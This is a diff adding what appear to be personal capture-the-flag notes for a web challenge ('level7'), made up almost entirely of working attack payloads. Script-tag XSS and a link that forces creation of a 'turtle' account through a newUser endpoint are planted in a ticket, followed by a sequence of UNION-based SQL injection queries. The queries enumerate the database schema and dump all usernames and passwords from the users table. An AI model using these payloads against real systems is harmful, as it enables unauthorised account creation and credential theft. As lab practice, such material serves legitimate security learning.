@@ -1,0 +1,13 @@
+<script>fetch("https://INSTANCE_URL/newUser?username=turtle&password=1234&password2=1234");</script>
+<script>fetch("http://localhost/newUser?username=turtle&password=1234&password2=1234");</script>
+
+Doesn't work, apearently the automated ticket inspection doesn't load the xss:(
+
+Slap this bad boy to the title and body and it'll work.
+<a href="http://localhost/newUser?username=turtle&password=1234&password2=1234">hello</a>
+
+/ticket?id=20 UNION SELECT 1, 2, CONCAT(@@version, Database(), User())--
+/ticket?id=20 UNION SELECT 1, 2, Database()--
+/ticket?id=20 UNION SELECT NULL, NULL, GROUP_CONCAT(TABLE_NAME SEPARATOR 0x3c62723e) FROM information_schema.tables WHERE table_schema = 'level7' --
+/ticket?id=20 UNION SELECT TABLE_NAME, NULL, GROUP_CONCAT(column_name SEPARATOR 0x3c62723e) FROM information_schema.columns WHERE table_name = 'users' --
+/ticket?id=20 UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(id, '~', username, '~', password) SEPARATOR 0x3c62723e) FROM users --
